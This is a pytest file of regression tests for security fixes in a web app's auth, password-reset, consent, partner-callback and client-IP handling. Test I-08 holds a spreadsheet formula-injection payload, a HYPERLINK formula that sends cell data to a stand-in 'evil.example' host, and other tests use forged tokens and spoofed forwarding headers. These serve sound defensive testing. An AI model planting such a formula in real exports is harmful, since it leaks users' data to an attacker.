"""Regression tests for the QA audit security fixes (Phase 2, area *sec*).

Each test names the audit item it pins.
"""

from __future__ import annotations

import io
import json
import time
import uuid
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import func, select, update
from starlette.requests import Request

from app.api import auth as auth_api
from app.api import integrations as integrations_api
from app.api.deps import client_ip
from app.core import csv_safe
from app.core.config import settings
from app.core.constants import (
    ConsentScope,
    IntegrationEventStatus,
    IntegrationSystem,
    Role,
    UserStatus,
)
from app.core.security import create_token, hash_password, verify_password
from app.models.audit import AuditLog
from app.models.auth_token import RevokedToken
from app.models.integration import IntegrationEvent
from app.models.user import User, UserRole
from app.schemas.auth import password_is_weak
from app.services import auth_service, integration_gateway
from app.services.audit_service import record_consent
from app.services.firebase_auth import GoogleIdentity

API = "/api/v1"
EMAIL = "malika@example.uz"
PASSWORD = "yashil-olma-bogi"
BODY = {"X-Refresh-Transport": "body"}


async def make_user(session, email=EMAIL, password=PASSWORD, *roles: Role, verified=False):
    user = User(
        email=email,
        password_hash=hash_password(password) if password else None,
        status=UserStatus.ACTIVE,
        auth_provider="password" if password else "google",
        email_verified=verified,
    )
    session.add(user)
    await session.flush()
    for role in roles or (Role.USER,):
        session.add(UserRole(user_id=user.id, role=role))
    await session.flush()
    return user


async def login(client, email=EMAIL, password=PASSWORD, headers=None):
    return await client.post(
        f"{API}/auth/login", json={"email": email, "password": password}, headers=headers or {}
    )


def bearer(user: User, role: Role = Role.USER) -> dict:
    token = create_token(user.id, role, "access", {"roles": [role.value], "gen": 0})
    return {"Authorization": f"Bearer {token}"}


# --------------------------------------------------------------------- C-01


async def test_c01_a_second_tab_within_the_grace_gets_its_own_pair(client, session):
    await make_user(session)
    first = (await login(client, headers=BODY)).json()["refresh_token"]

    a = await client.post(f"{API}/auth/refresh", json={"refresh_token": first})
    b = await client.post(f"{API}/auth/refresh", json={"refresh_token": first})
    assert a.status_code == 200 and b.status_code == 200
    # Both tabs stay signed in.
    for pair in (a.json(), b.json()):
        me = await client.get(
            f"{API}/users/me", headers={"Authorization": f"Bearer {pair['access_token']}"}
        )
        assert me.status_code == 200


async def test_c01_a_reuse_after_the_grace_still_ends_every_session(client, session):
    await make_user(session)
    first = (await login(client, headers=BODY)).json()["refresh_token"]
    fresh = await client.post(f"{API}/auth/refresh", json={"refresh_token": first})
    assert fresh.status_code == 200
    await session.execute(
        update(RevokedToken).values(created_at=datetime.now(UTC) - timedelta(seconds=120))
    )
    await session.commit()

    replay = await client.post(f"{API}/auth/refresh", json={"refresh_token": first})
    assert replay.status_code == 401
    me = await client.get(
        f"{API}/users/me", headers={"Authorization": f"Bearer {fresh.json()['access_token']}"}
    )
    assert me.status_code == 401


async def test_c01_signing_out_closes_the_grace_of_the_previous_token(client, session):
    await make_user(session)
    first = (await login(client, headers=BODY)).json()["refresh_token"]
    second = (await client.post(f"{API}/auth/refresh", json={"refresh_token": first})).json()[
        "refresh_token"
    ]
    assert (
        await client.post(f"{API}/auth/logout", json={"refresh_token": second})
    ).status_code == 204
    assert (
        await client.post(f"{API}/auth/refresh", json={"refresh_token": first})
    ).status_code == 401


# --------------------------------------------------------------------- C-03


async def test_c03_logout_with_an_expired_access_token_still_ends_the_session(client, session):
    await make_user(session)
    refresh = (await login(client, headers=BODY)).json()["refresh_token"]

    out = await client.post(
        f"{API}/auth/logout",
        json={"refresh_token": refresh},
        headers={"Authorization": "Bearer expired.token.x"},
    )
    assert out.status_code == 204
    assert (
        await client.post(f"{API}/auth/refresh", json={"refresh_token": refresh})
    ).status_code == 401
    # Nothing at all is still a 204.
    assert (await client.post(f"{API}/auth/logout")).status_code == 204


# --------------------------------------------------------------------- C-04


@pytest.fixture
def outbox(monkeypatch):
    sent: list[tuple[str, str, str]] = []

    async def capture(to, link, language):
        sent.append((to, link, language))

    monkeypatch.setattr(auth_api, "_send_reset", capture)
    return sent


async def forgot(client, email=EMAIL, **extra):
    return await client.post(f"{API}/auth/password/forgot", json={"email": email, **extra})


def token_of(link: str) -> str:
    assert "/parol-tiklash?token=" in link
    return link.split("token=", 1)[1]


async def test_c04_forgot_is_202_whoever_asks_and_mails_only_a_real_account(
    client, session, outbox
):
    await make_user(session)
    unknown = await forgot(client, "nobody@example.uz")
    known = await forgot(client, language="ru")
    assert unknown.status_code == known.status_code == 202
    assert unknown.content == known.content
    assert len(outbox) == 1 and outbox[0][0] == EMAIL and outbox[0][2] == "ru"


async def test_c04_desk_accounts_get_no_reset_link(client, session, outbox):
    await make_user(session, "desk@example.uz", PASSWORD, Role.ADMIN)
    assert (await forgot(client, "desk@example.uz")).status_code == 202
    assert outbox == []


async def test_c04_reset_sets_the_password_once_and_ends_every_session(client, session, outbox):
    user = await make_user(session)
    old_refresh = (await login(client, headers=BODY)).json()["refresh_token"]
    await forgot(client)
    token = token_of(outbox[0][1])

    weak = await client.post(
        f"{API}/auth/password/reset", json={"token": token, "password": "aaaaaaaa"}
    )
    assert weak.status_code == 422 and weak.json()["detail"] == "weak_password"

    done = await client.post(
        f"{API}/auth/password/reset", json={"token": token, "password": "yangi-parol-2026"}
    )
    assert done.status_code == 204
    await session.refresh(user)
    assert verify_password("yangi-parol-2026", user.password_hash)
    assert user.email_verified is True
    assert (
        await client.post(f"{API}/auth/refresh", json={"refresh_token": old_refresh})
    ).status_code == 401
    assert (await login(client, password="yangi-parol-2026")).status_code == 200

    again = await client.post(
        f"{API}/auth/password/reset", json={"token": token, "password": "boshqa-parol-77"}
    )
    assert again.status_code == 400 and again.json()["detail"] == "reset_token_invalid"


async def test_c04_an_expired_or_forged_token_is_refused(client, session, outbox):
    await make_user(session)
    await forgot(client)
    token = token_of(outbox[0][1])
    from app.models.user import OtpChallenge

    await session.execute(
        update(OtpChallenge).values(expires_at=datetime.now(UTC) - timedelta(minutes=1))
    )
    for candidate in (token, token[:-3] + "abc", "garbage-token-value"):
        response = await client.post(
            f"{API}/auth/password/reset", json={"token": candidate, "password": "yangi-parol-2026"}
        )
        assert response.status_code == 400
        assert response.json()["detail"] == "reset_token_invalid"


async def test_c04_only_the_newest_link_works(client, session, outbox):
    await make_user(session)
    await forgot(client)
    await forgot(client)
    first, second = token_of(outbox[0][1]), token_of(outbox[1][1])
    assert (
        await client.post(
            f"{API}/auth/password/reset", json={"token": first, "password": "yangi-parol-2026"}
        )
    ).status_code == 400
    assert (
        await client.post(
            f"{API}/auth/password/reset", json={"token": second, "password": "yangi-parol-2026"}
        )
    ).status_code == 204


async def test_c04_a_mailbox_is_not_flooded(client, session, outbox):
    await make_user(session)
    for _ in range(6):
        assert (await forgot(client)).status_code == 202
    assert len(outbox) == settings.password_reset_identifier_per_hour


# --------------------------------------------------------------------- C-08


async def test_c08_a_held_address_is_told_so_and_a_reset_lifts_the_hold(client, session, outbox):
    await make_user(session)
    for n in range(settings.login_failures_per_hour):
        await login(client, password="wrong-password", headers={"X-Forwarded-For": f"10.9.0.{n}"})

    held = await login(client, headers={"X-Forwarded-For": "10.9.1.1"})
    assert held.status_code == 429
    assert held.json()["detail"] == "account_locked"
    assert int(held.headers["Retry-After"]) > 0
    # An unknown address is held the same way, so the answer reveals nothing.
    for n in range(settings.login_failures_per_hour):
        await login(client, "ghost@example.uz", "x", headers={"X-Forwarded-For": f"10.8.0.{n}"})
    ghost = await login(client, "ghost@example.uz", "x", headers={"X-Forwarded-For": "10.8.1.1"})
    assert ghost.status_code == 429 and ghost.json()["detail"] == "account_locked"

    await forgot(client)
    await client.post(
        f"{API}/auth/password/reset",
        json={"token": token_of(outbox[0][1]), "password": "yangi-parol-2026"},
    )
    ok = await login(client, password="yangi-parol-2026", headers={"X-Forwarded-For": "10.9.2.1"})
    assert ok.status_code == 200


# ------------------------------------------------------------- C-10 / I-21


async def register(client, email, password, ip="10.7.0.1"):
    return await client.post(
        f"{API}/auth/register",
        json={"email": email, "password": password, "accepted_privacy_policy": True},
        headers={"X-Forwarded-For": ip},
    )


async def test_c10_registration_errors_carry_a_code(client, session):
    weak = await register(client, "a@example.uz", "password123")
    assert weak.status_code == 422 and weak.json()["detail"] == "weak_password"
    domain = await register(client, "x@example.test", "yashil-olma-bogi")
    assert domain.status_code == 422 and domain.json()["detail"] == "email_domain_unsupported"
    assert (await register(client, "b@example.uz", "yashil-olma-bogi")).status_code == 201
    taken = await register(client, "b@example.uz", "yashil-olma-bogi")
    assert taken.status_code == 409 and taken.json()["detail"] == "email_taken"
    malformed = await register(client, "not-an-address", "yashil-olma-bogi")
    assert malformed.status_code == 422 and malformed.json()["detail"] == "Validation failed"


@pytest.mark.parametrize(
    "password",
    ["aaaaaaaa", " " * 8, "   abc   ", "12345678", "87654321", "abcdefgh", "abababab", "qwertyui"],
)
def test_i21_trivial_passwords_are_weak(password):
    assert password_is_weak(password, "someone@example.uz")


@pytest.mark.parametrize("password", ["yashil-olma-bogi", "Toshkent kuzi 26", "m3ning-parolim"])
def test_i21_ordinary_passwords_pass(password):
    assert not password_is_weak(password, "someone@example.uz")


# --------------------------------------------------------------------- I-06


async def delete_me(client, headers, body=None):
    return await client.request("DELETE", f"{API}/users/me", headers=headers, json=body)


async def test_i06_erasure_needs_the_current_password(client, session):
    user = await make_user(session)
    headers = bearer(user)
    assert (await delete_me(client, headers, {})).json()["detail"] == "password_incorrect"
    wrong = await delete_me(client, headers, {"password": "not-mine"})
    assert wrong.status_code == 403
    assert (await session.get(User, user.id)).status == UserStatus.ACTIVE
    ok = await delete_me(client, headers, {"password": PASSWORD})
    assert ok.status_code == 200
    await session.refresh(user)
    assert user.status == UserStatus.DELETED
    # Her other sessions end with the account.
    assert (await client.get(f"{API}/users/me/goals", headers=headers)).status_code == 401


async def test_i06_an_account_without_a_password_types_delete(client, session):
    user = await make_user(session, "g@gmail.com", None)
    headers = bearer(user)
    refused = await delete_me(client, headers, {"confirm": "yes"})
    assert refused.status_code == 422 and refused.json()["detail"] == "confirmation_required"
    assert (await delete_me(client, headers, {"confirm": "DELETE"})).status_code == 200


async def test_i06_the_last_admin_cannot_erase_herself(client, session):
    admin = await make_user(session, "boss@example.uz", PASSWORD, Role.ADMIN)
    headers = bearer(admin, Role.ADMIN)
    last = await delete_me(client, headers, {"password": PASSWORD})
    assert last.status_code == 409 and last.json()["detail"] == "last_admin"
    await make_user(session, "boss2@example.uz", PASSWORD, Role.ADMIN)
    assert (await delete_me(client, headers, {"password": PASSWORD})).status_code == 200


# --------------------------------------------------------------------- I-07


async def test_i07_google_linking_an_unverified_account_drops_its_password(session):
    user = await make_user(session, "victim@gmail.com", "attackers-password")
    before = user.session_generation
    identity = GoogleIdentity(
        subject="uid-victim",
        email="victim@gmail.com",
        given_name="V",
        family_name="",
        picture=None,
    )
    linked, created = await auth_service.login_with_google(session, identity)
    assert not created and linked.id == user.id
    assert linked.password_hash is None
    assert linked.session_generation == before + 1


async def test_i07_a_verified_account_keeps_its_password(session):
    user = await make_user(session, "own@gmail.com", PASSWORD, verified=True)
    identity = GoogleIdentity(
        subject="uid-own", email="own@gmail.com", given_name="O", family_name="", picture=None
    )
    linked, _ = await auth_service.login_with_google(session, identity)
    assert linked.id == user.id and linked.password_hash is not None


# --------------------------------------------------------------------- I-08


def test_i08_formula_cells_are_neutralised():
    buffer = io.StringIO()
    writer = csv_safe.writer(buffer)
    writer.writerow(['=HYPERLINK("http://evil.example/?"&A1,"x")', "+1", "-2", "@x", "ok", -3, 4.5])
    line = buffer.getvalue().strip()
    assert line.startswith("\"'=HYPERLINK")
    assert ",'+1,'-2,'@x,ok,-3,4.5" in line


# --------------------------------------------------------------------- I-09


async def test_i09_withdrawing_consent_cancels_what_is_queued(client, session):
    user = await make_user(session)
    headers = bearer(user)
    await client.post(
        f"{API}/users/me/consents",
        json={"scope": "share_edu_job", "accepted": True},
        headers=headers,
    )
    assert (
        await client.post(f"{API}/integrations/sync-profile?system=edu_job", headers=headers)
    ).status_code == 200
    await client.post(
        f"{API}/users/me/consents",
        json={"scope": "share_edu_job", "accepted": False},
        headers=headers,
    )
    event = await session.scalar(select(IntegrationEvent))
    await session.refresh(event)
    assert event.status == IntegrationEventStatus.CANCELLED


async def test_i09_consent_is_read_again_at_send_time(session, monkeypatch):
    user = await make_user(session)
    await record_consent(
        session,
        user_id=user.id,
        scope=ConsentScope.SHARE_EDU_JOB,
        accepted=True,
        policy_version="1.0",
    )
    await session.flush()
    event = await integration_gateway.queue_event(
        session,
        system=IntegrationSystem.EDU_JOB,
        event_type="user.sync",
        payload={},
        user_id=user.id,
    )
    await session.flush()
    # Withdrawn behind the outbox's back (no cancel ran).
    await record_consent(
        session,
        user_id=user.id,
        scope=ConsentScope.SHARE_EDU_JOB,
        accepted=False,
        policy_version="1.0",
    )
    await session.flush()
    monkeypatch.setattr(settings, "edu_job_base_url", "https://partner.invalid")

    class NoNetwork:
        async def post(self, *args, **kwargs):  # pragma: no cover - must not run
            raise AssertionError("nothing may be sent")

    assert await integration_gateway.deliver(session, event, NoNetwork()) is False
    assert event.status == IntegrationEventStatus.CANCELLED


# --------------------------------------------------------------------- I-10


def _signed(secret: str, body: bytes, stamp: int | None = None) -> dict:
    stamp = str(stamp if stamp is not None else int(time.time()))
    return {
        "X-Client-Id": "edu-client",
        "Content-Type": "application/json",
        "X-Timestamp": stamp,
        "X-Signature": integrations_api.callback_signature(secret, stamp, body),
    }


async def test_i10_callbacks_need_a_secret_outside_local(client, monkeypatch):
    monkeypatch.setattr(settings, "edu_job_client_id", "edu-client")
    monkeypatch.setattr(settings, "edu_job_client_secret", None)
    monkeypatch.setattr(settings, "environment", "staging")
    response = await client.post(
        f"{API}/integrations/edu_job/opportunities/sync",
        json=[],
        headers={"X-Client-Id": "edu-client"},
    )
    assert response.status_code == 503


async def test_i10_stale_and_replayed_callbacks_are_refused(client, monkeypatch):
    monkeypatch.setattr(settings, "edu_job_client_id", "edu-client")
    monkeypatch.setattr(settings, "edu_job_client_secret", "edu-secret")
    url = f"{API}/integrations/edu_job/opportunities/sync"
    body = b"[]"
    stale = _signed("edu-secret", body, int(time.time()) - 3600)
    assert (await client.post(url, content=body, headers=stale)).status_code == 401
    fresh = _signed("edu-secret", body)
    assert (await client.post(url, content=body, headers=fresh)).status_code == 200
    assert (await client.post(url, content=body, headers=fresh)).status_code == 401
    # The body alone, signed the old way, is no longer enough.
    unstamped = {k: v for k, v in fresh.items() if k != "X-Timestamp"}
    assert (await client.post(url, content=body, headers=unstamped)).status_code == 401


# --------------------------------------------------------------------- I-11


async def test_i11_staff_content_actions_are_audited(client, session, admin_headers):
    created = await client.post(
        f"{API}/ai/knowledge",
        json={
            "title": "Doc",
            "content": "Matn " * 50,
            "source_type": "guideline",
            "language": "uz",
        },
        headers=admin_headers,
    )
    assert created.status_code == 201, created.text
    doc_id = created.json()["id"]
    await client.post(f"{API}/ai/knowledge/{doc_id}/approve", headers=admin_headers)
    await client.delete(f"{API}/ai/knowledge/{doc_id}", headers=admin_headers)
    await client.get(f"{API}/ai/risk-flags", headers=admin_headers)
    actions = set((await session.scalars(select(AuditLog.action))).all())
    assert {"knowledge.add", "knowledge.approve", "knowledge.delete", "risk_flag.list"} <= actions


# --------------------------------------------------------------------- I-12


async def test_i12_successful_registrations_count_against_the_address(client, session):
    codes = [
        (
            await register(client, f"farm{n}@example.uz", "yashil-olma-bogi", ip="10.6.0.1")
        ).status_code
        for n in range(settings.register_ip_limit + 1)
    ]
    assert codes[: settings.register_ip_limit] == [201] * settings.register_ip_limit
    assert codes[-1] == 429
    # Another address is not affected.
    assert (
        await register(client, "other@example.uz", "yashil-olma-bogi", "10.6.0.2")
    ).status_code == 201


# --------------------------------------------------------------------- I-13


async def test_i13_nul_bytes_are_a_422_not_a_500(client, auth_headers):
    assert (await client.get(f"{API}/programs?search=a%00b")).status_code == 422
    assert (await client.get(f"{API}/portfolio/public/%00")).status_code == 422
    goal = await client.post(
        f"{API}/users/me/goals",
        content=json.dumps({"title": "nul\u0000byte", "horizon": "1y"}),
        headers={**auth_headers, "Content-Type": "application/json"},
    )
    assert goal.status_code == 422
    assert goal.json()["request_id"]


# --------------------------------------------------------------------- I-17


async def test_i17_a_token_for_a_missing_account_authenticates_nobody(client, session):
    ghost = create_token(uuid.uuid4(), Role.USER, "access", {"roles": ["user"]})
    response = await client.get(
        f"{API}/users/me/goals", headers={"Authorization": f"Bearer {ghost}"}
    )
    assert response.status_code == 401


# --------------------------------------------------------------------- I-18


def _request(peer: str, headers: dict[str, str]) -> Request:
    return Request(
        {
            "type": "http",
            "client": (peer, 1234),
            "headers": [(k.lower().encode(), v.encode()) for k, v in headers.items()],
        }
    )


def test_i18_forwarded_headers_count_only_from_a_trusted_proxy(monkeypatch):
    spoof = {"X-Forwarded-For": "10.9.9.9", "CF-Connecting-IP": "10.9.9.9"}
    assert client_ip(_request("203.0.113.5", spoof)) == "203.0.113.5"
    assert client_ip(_request("172.18.0.2", {"X-Forwarded-For": "1.2.3.4, 198.51.100.7"})) == (
        "198.51.100.7"
    )
    assert (
        client_ip(_request("172.18.0.2", {"X-Forwarded-For": "198.51.100.7, 172.18.0.9"}))
        == "198.51.100.7"
    )
    monkeypatch.setattr(settings, "client_ip_header", "cf-connecting-ip")
    assert client_ip(_request("172.18.0.2", {"CF-Connecting-IP": "198.51.100.8"})) == (
        "198.51.100.8"
    )
    assert client_ip(_request("203.0.113.5", spoof)) == "203.0.113.5"


# --------------------------------------------------------------------- I-19


async def test_i19_a_chunked_body_past_the_limit_is_refused(client, monkeypatch, auth_headers):
    monkeypatch.setattr(settings, "max_request_body_bytes", 1000)

    async def chunks():
        for _ in range(10):
            yield b'{"title": "' + b"x" * 200

    response = await client.post(
        f"{API}/users/me/goals",
        content=chunks(),
        headers={**auth_headers, "Content-Type": "application/json"},
    )
    assert response.status_code == 413


# --------------------------------------------------------------------- I-20


async def test_i20_free_text_profile_fields_are_bounded(client, auth_headers):
    response = await client.put(
        f"{API}/users/me/profile", json={"bio": "b" * 5000}, headers=auth_headers
    )
    assert response.status_code == 422


# --------------------------------------------------------------------- I-23


def test_i23_each_partner_gets_its_own_pseudonym():
    user_id = uuid.uuid4()
    edu = integration_gateway.partner_pseudonym(IntegrationSystem.EDU_JOB, user_id)
    hub = integration_gateway.partner_pseudonym(IntegrationSystem.INVEST_HUB, user_id)
    assert edu != hub
    assert str(user_id) not in edu and user_id.hex not in edu
    assert edu == integration_gateway.partner_pseudonym(IntegrationSystem.EDU_JOB, user_id)


async def test_i23_a_partner_names_her_by_its_pseudonym(client, session, monkeypatch):
    monkeypatch.setattr(settings, "edu_job_client_id", "edu-client")
    monkeypatch.setattr(settings, "edu_job_client_secret", "edu-secret")
    user = await make_user(session)
    await record_consent(
        session,
        user_id=user.id,
        scope=ConsentScope.SHARE_EDU_JOB,
        accepted=True,
        policy_version="1.0",
    )
    payload = integration_gateway.minimal_profile_payload(
        user, None, system=IntegrationSystem.EDU_JOB
    )
    await integration_gateway.queue_event(
        session,
        system=IntegrationSystem.EDU_JOB,
        event_type="user.sync",
        payload=payload,
        user_id=user.id,
    )
    await session.flush()
    assert payload["womanup_id"] != str(user.id)

    body = json.dumps({"source": "edu_job", "outcome_type": "employment"}).encode()
    url = f"{API}/integrations/edu_job/outcomes?user_id={payload['womanup_id']}"
    assert (
        await client.post(url, content=body, headers=_signed("edu-secret", body))
    ).status_code == 201
    other = integration_gateway.partner_pseudonym(IntegrationSystem.INVEST_HUB, user.id)
    url = f"{API}/integrations/edu_job/outcomes?user_id={other}"
    assert (
        await client.post(
            url, content=body, headers=_signed("edu-secret", body, int(time.time()) - 1)
        )
    ).status_code == 404
    count = await session.scalar(select(func.count()).select_from(IntegrationEvent))
    assert count == 1
